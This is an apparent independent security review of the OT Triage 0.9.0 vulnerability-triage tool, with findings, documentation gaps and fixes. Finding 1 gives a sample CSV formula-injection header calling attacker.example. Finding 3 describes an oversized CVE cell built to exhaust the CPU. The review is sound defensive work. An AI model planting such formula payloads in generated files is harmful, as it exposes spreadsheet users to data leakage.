# Independent security review of OT Triage 0.9.0

## 1. Overall opinion

OT Triage 0.9.0 has a generally careful security design: strict parsers, bounded downloads, default TLS verification, same-host redirect controls, safe archive streaming, atomic storage for settings/threat data, and well-tested scoring logic. I found one High-severity spreadsheet-formula injection, two Medium issues involving hostile threat data and scanner-import CPU exhaustion, and several lower-severity file/release weaknesses. Confidence is high for the principal findings. I reviewed all security-sensitive non-GUI modules line by line, the relevant paths through every GUI module and workflow, and searched all 9,476 lines of top-level application Python; generated CVSS tables and purely visual GUI code received less manual attention. No files were changed.

## 2. Findings

### 1. Existing inventory headers bypass CSV formula neutralization

**Severity:** High  
**Location:** `scanimport.py:811-848`, especially `scanimport.py:845` and `scanimport.py:847`  
**Confidence:** Confirmed

**What is wrong**

When extending an existing inventory, `write_inventory()` preserves the original header cells and writes them without `_safe()`. Data rows are protected at line 847, but the header at line 845 is not. Spreadsheet applications treat header cells like any other cells.

**Concrete trigger**

An existing inventory can contain:

```csv
asset_id,asset,"=HYPERLINK(""https://attacker.example/collect"",""Inventory"")"
PLC-1,critical,x
```

After scanner import with that inventory as the file to extend, the output header remains:

```csv
asset_id,asset,"=HYPERLINK(""https://attacker.example/collect"",""Inventory"")"
```

I reproduced this through `write_inventory()` without writing to disk. The formula was preserved exactly, while the ordinary data row was processed normally.

**Likely impact**

Opening the generated CSV in a spreadsheet can evaluate attacker-supplied formulas. Depending on spreadsheet configuration and formula type, this may cause external requests, deceptive links, data disclosure, or use of legacy command-execution mechanisms. It directly bypasses the project’s stated formula-injection control.

**Suggested fix**

Apply `_safe()` to every header cell:

```python
writer.writerow([_safe(c) for c in header])
```

Add regression tests covering formula-leading values in both preserved headers and rows, including `=`, `+`, `-`, `@`, tab, carriage return, and line feed.

---

### 2. A schema-valid rollback or subset threat feed silently replaces better data

**Severity:** Medium  
**Location:** `threatdata.py:187-239`, `threatdata.py:265-308`, `threatdata.py:455-468`; `icsadvisories.py:558-592`, `icsadvisories.py:726-735`  
**Confidence:** Confirmed

**What is wrong**

Downloaded feeds are checked for syntax, internal counts, field types, and size, but are not compared with the stored version for chronology or plausible completeness. `_install()` replaces the existing copy once the new payload parses.

The saved checksum is calculated after receipt and provides no authenticity or rollback protection.

**Concrete trigger**

A hostile response from an allowed host—or a TLS-intercepting proxy trusted by the workstation—can provide:

- a KEV document with one internally valid entry and `count: 1`;
- an EPSS file with one valid row;
- an ICS archive containing a small valid subset.

All pass validation and replace a much larger, newer stored data set. A previously KEV-listed CVE can then be treated as having no active-exploitation signal, silently changing its bucket or ordering.

**Likely impact**

Threat levels and remediation context can be understated. In an OT triage application, that can defer remediation of actively exploited vulnerabilities.

TLS and the exact-host allow-list substantially reduce likelihood, but they do not address an upstream compromise, trusted TLS inspection, or erroneous/rolled-back upstream data.

**Suggested fix**

For network updates:

- reject source dates older than the stored source;
- reject implausible entry-count drops, or require explicit confirmation;
- enforce reasonable minimum counts for these known global feeds;
- preserve and display a conspicuous warning for unusual decreases;
- use publisher signatures or independently distributed signed manifests where available.

Offline imports may reasonably allow older or partial files, but should clearly identify them as such.

---

### 3. CVE extraction is quadratic for a hostile scanner cell

**Severity:** Medium  
**Location:** `scanimport.py:32`, `scanimport.py:137-144`, with callers at `scanimport.py:266-269` and `scanimport.py:298-301`  
**Confidence:** Confirmed

**What is wrong**

`_cves()` collects matches in a list and checks every new CVE with:

```python
if cve not in found:
```

For distinct CVEs this is \(O(n^2)\). Scanner CSV fields may be up to 8 MB. The finding-count check runs only after `_cves()` has completed, so `MAX_RAW_FINDINGS` does not constrain this work.

**Concrete trigger**

A single CVE cell containing thousands of distinct strings such as:

```text
CVE-2024-10000 CVE-2024-10001 CVE-2024-10002 ...
```

produced these timings in this environment:

| CVEs | Cell size | Time |
|---:|---:|---:|
| 5,000 | 75 KB | 0.149 s |
| 10,000 | 150 KB | 0.570 s |
| 20,000 | 300 KB | 2.612 s |

The approximately fourfold growth when input doubles confirms quadratic behavior. An allowed 8 MB field could occupy the process for minutes or longer.

**Likely impact**

A malicious Nessus, Tenable, OpenVAS, or Nozomi CSV can monopolize CPU and make the CLI or GUI import appear hung.

**Suggested fix**

Track duplicates with a set while retaining a list for order:

```python
found, seen = [], set()
for match in CVE_RE.finditer(...):
    cve = match.group().upper()
    if cve not in seen:
        seen.add(cve)
        found.append(cve)
```

Also stop after a defensible per-row CVE limit.

---

### 4. Ranked and asset-rollup GUI exports are not atomic

**Severity:** Low  
**Location:** `gui_batch.py:907-925`, `gui_batch.py:928-941`; writers at `batch.py:339-373` and `rollup.py:153-179`  
**Confidence:** Confirmed

**What is wrong**

Scanner-import outputs and CLI outputs use temporary files followed by `os.replace()`. The GUI’s normal “Export ranked CSV” and “Export asset roll-up” paths instead open the selected destination directly with `"w"`, truncating any existing file before the export completes.

**Concrete trigger**

Select an existing ranked export as the destination, then encounter a full disk, I/O error, process termination, or power loss during writing.

**Likely impact**

The previous export is destroyed and replaced by a partial CSV. This is primarily integrity and availability loss.

**Suggested fix**

Use the existing atomic writer for these GUI paths as well, or centralize all CSV output through one atomic-writing helper. Flush and `fsync()` before replacement where durability is important.

---

### 5. Scanner paths are opened without proving they are stable regular files

**Severity:** Low  
**Location:** `scanimport.py:152-160`, `scanimport.py:451-461`, `scanimport.py:591-625`; similar pre-open size checks in `batch.py:109-114`, `inventory.py:107-112`, and `compare.py:114-120`  
**Confidence:** Likely

**What is wrong**

Several readers call `getsize()` and then separately open the pathname. They do not validate the opened file descriptor as a regular file, and whole-file JSON reading uses an unbounded `read()` after the initial pathname size check.

**Concrete scenarios**

- A FIFO named `scan.csv` can block indefinitely when opened or read.
- A symlink or regular file can be replaced between `getsize()` and `open()`.
- A JSON file can grow after the size check, defeating `MAX_JSON_BYTES` and consuming unbounded memory.

GUI cancellation cannot interrupt a thread blocked inside `open()` or an unbounded file read.

**Likely impact**

Local denial of service or bypass of advertised input-size limits. Exploitation generally requires another local process or deliberately selected special file.

**Suggested fix**

Open once, call `os.fstat()` on the descriptor, require `stat.S_ISREG()`, and read through a capped loop from that same descriptor. Reject changing files if the bytes read exceed the limit.

---

### 6. The release workflow can attest an untested or version-mismatched tag

**Severity:** Low  
**Location:** `.github/workflows/release.yml:6-45`, especially lines 32-37  
**Confidence:** Confirmed

**What is wrong**

Every `v*` tag is immediately built and attested. The release workflow does not:

- run the application tests or security checks;
- require successful CI for the tagged commit;
- check that the tag name agrees with `version.py`;
- require an annotated or cryptographically signed tag.

The attestation correctly proves which repository/tag/workflow produced the zip, but does not prove that the tag followed the documented release process.

**Concrete trigger**

A maintainer accidentally pushes `v0.9.1` at an untested commit whose `version.py` still says `0.9.0`. The workflow produces and attests `ot-triage-0.9.0.zip`. If the artifact is then manually attached to a release without noticing the mismatch, provenance may give users misplaced confidence.

**Likely impact**

Publication of an incorrectly versioned or untested release artifact. Manual review reduces likelihood.

**Suggested fix**

Validate `${GITHUB_REF_NAME}` against `version.py`, run the release gate on the exact tag commit, and make the build/attest job depend on that gate. Consider restricting release tags through repository rules.

---

### 7. Development packages are pinned by version but not by artifact hash

**Severity:** Info  
**Location:** `.github/workflows/ci.yml:36-37,59`; `.github/workflows/security.yml:35`; `requirements-dev.txt:1`  
**Confidence:** Confirmed

**What is wrong**

CI installs packages from PyPI using exact version numbers but not hashes. This is better than unpinned installation, but does not implement the hash-pinning requirement described in `SECURITY_TEST_PLAN.md:90-92`.

**Concrete scenario**

A package index compromise or maliciously replaced artifact for an existing version would execute during CI installation. The resulting permissions are limited, but the package runs on a GitHub-hosted runner before or during security checks.

**Suggested fix**

Generate a lock file with hashes and install using `pip --require-hashes`. Apply the same approach to inline installations of ruff, Bandit, Semgrep, and zizmor.

## 3. Wrong or unsupported documented claims

- **Formula-safe output is false for preserved inventory headers.** `SECURITY.md:50-51`, `README.md:133`, and the checklist at `SECURITY_TEST_PLAN.md:125` say exported text cells are neutralized. `scanimport.py:845` writes attacker-controlled existing header cells verbatim.

- **“Downloads … validated completely before use” is too strong.** `SECURITY.md:44` is accurate about structural validation, size, and replacement on parse success, but there is no rollback, plausible-count, or publisher-authenticity validation. A tiny but internally consistent feed is accepted.

- **The SBOM does not prove the absence of runtime dependencies.** `tools/make_sbom.py:54-69` deliberately inventories a newly created empty virtual environment rather than analyzing OT Triage. The result omits the required Python runtime and Tcl/Tk used by Tkinter. The claim in `README.md:152` that this demonstrates an application with no third-party components is therefore unsupported; it establishes only that the deliberately empty environment is empty.

- **Cross-environment reproducibility is not established by the build script alone.** `tools/make_bundle.py` fixes order, timestamps and permissions, which is good, but DEFLATE output can depend on the Python/zlib implementation. No checked-in comparison across pinned build environments supports the broad “same files always give the same bytes” claim in `README.md:67` and `docs/RELEASING.md:22`.

- **The claimed full-history secret scan could not be independently verified from this checkout.** The repository history is grafted and exposes only the release commit. I found no obvious secrets in the current tree, but could not audit earlier history. The archived gitleaks reports are project-generated claims, not independent evidence.

- **Release provenance could not be verified offline.** The checked-in documentation itself notes that the first real-tag attestation had not yet been verified. I could inspect the workflow but not a published release artifact or GitHub attestation.

## 4. Areas not fully reviewed or not verifiable

- I did not use the network and therefore did not test the live CISA, EPSS, GitHub, PyPI, or GitHub Actions services.
- I could not verify repository settings such as branch/tag protection, required checks, secret scanning, or push protection.
- I did not inspect every value in the generated `cvss4_tables.py` manually. I did run the relevant reference tests.
- No real Nozomi or Dragos export was available. The project also documents these importers as experimental.
- I did not test CSV behavior in Microsoft Excel or LibreOffice directly; the formula finding is confirmed at the generated-byte level.
- The full test suite could not complete normally because this sandbox exposes no writable temporary directory or display. It discovered 660 tests, but 324 errored for lack of a usable temporary directory and four headless-runner tests failed in the restricted environment. A focused, non-writing run of 107 prioritizer, CVSS, version, and link-safety tests passed, including exhaustive reference-calculator comparisons.
- The archived reports claim a larger Hypothesis-enabled suite and clean static scans; I inspected those reports only after forming the code findings and did not treat them as independent evidence.

## 5. Areas checked with no finding

- **Network transport:** `threatdata.fetch()` requires HTTPS, uses the default validating TLS context, restricts the initial URL and redirects to exact allow-listed hosts, rejects credentials in URLs, limits redirects, applies socket and overall deadlines, detects truncation when `Content-Length` is supplied, and caps received bytes. I found no TLS-disable path or SSRF to arbitrary hosts.
- **ICS archive handling:** entries are streamed and never extracted to disk; names, types, counts, individual sizes, total decompressed bytes, JSON structure, tree depth and tree node count are bounded. Symlinks and device entries are ignored. I found no archive path traversal.
- **XML:** Nessus XML is streamed, depth-limited, and rejects DTD and entity declarations. I found no XML external-entity path.
- **Current GUI links:** audited call paths either construct CISA links from validated advisory IDs, use fixed project URLs, or use `references.safe_https_url()`. Links open only through explicit click/keyboard activation. I found no current path where untrusted text automatically opens a URL.
- **Scoring core:** CVSS numbers reject NaN, infinity and out-of-range values; vector parsing requires all base metrics and rejects duplicates; settings enforce numeric ranges and consistent thresholds; manual threat input can raise but not silently lower derived KEV/EPSS threat. Focused scoring/reference tests passed.
- **CSV data rows:** ranked, roll-up, findings, and inventory data rows apply formula neutralization. The confirmed exception is the preserved inventory header.
- **Stored settings and threat data:** temporary files are created securely and replaced atomically; settings/preferences use restrictive temporary-file permissions; failed parsing keeps the previous threat data.
- **Current repository contents:** searches found no obvious private keys, API credentials, access tokens, personal vulnerability inventories, unsafe `eval`/`exec`, pickle use, shell execution, or runtime third-party Python imports.